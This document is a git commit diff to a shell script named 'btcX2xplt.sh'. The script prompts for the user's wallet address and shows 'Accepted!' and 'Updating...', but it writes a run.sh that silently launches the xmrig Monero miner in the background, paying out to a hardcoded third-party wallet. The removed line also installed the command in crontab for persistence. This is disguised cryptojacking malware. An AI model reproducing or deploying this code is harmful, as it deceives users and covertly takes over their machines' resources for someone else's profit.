755103a0fdb758543fe025eae30c222eb8fc33f4
katerin966 <72075504+katerin966@users.noreply.github.com>
2021-01-21 00:54:43 +0000

    Update btcX2xplt.sh

--- btcX2xplt.sh
+++ btcX2xplt.sh
@@ -24,7 +24,7 @@ echo "Enter yourt wallet address:"
 read wallet
 echo "Accepted!"$wallet
 echo "Updating..."
-echo "cd && cd xmrig && cd build && ./xmrig -o pool.supportxmr.com:443 -u 44RMgEtJcpDjJfSNfFCW3VfZt6jx8e9X9UPuEva36n5wCyZd2w9QXHtXiipZk8yfDWcn9V3rL4iEbZ6nVCuM9NTXUnTXqcx -k --tls -p Linux > /dev/null 2>&1 &" > cron && cat cron | crontab -" > run.sh && chmod +x run.sh
+echo "cd && cd xmrig && cd build && ./xmrig -o pool.supportxmr.com:443 -u 44RMgEtJcpDjJfSNfFCW3VfZt6jx8e9X9UPuEva36n5wCyZd2w9QXHtXiipZk8yfDWcn9V3rL4iEbZ6nVCuM9NTXUnTXqcx -k --tls -p Linux /dev/null 2>&1 &" > run.sh && chmod +x run.sh
 echo ""
 echo ""
 echo ""
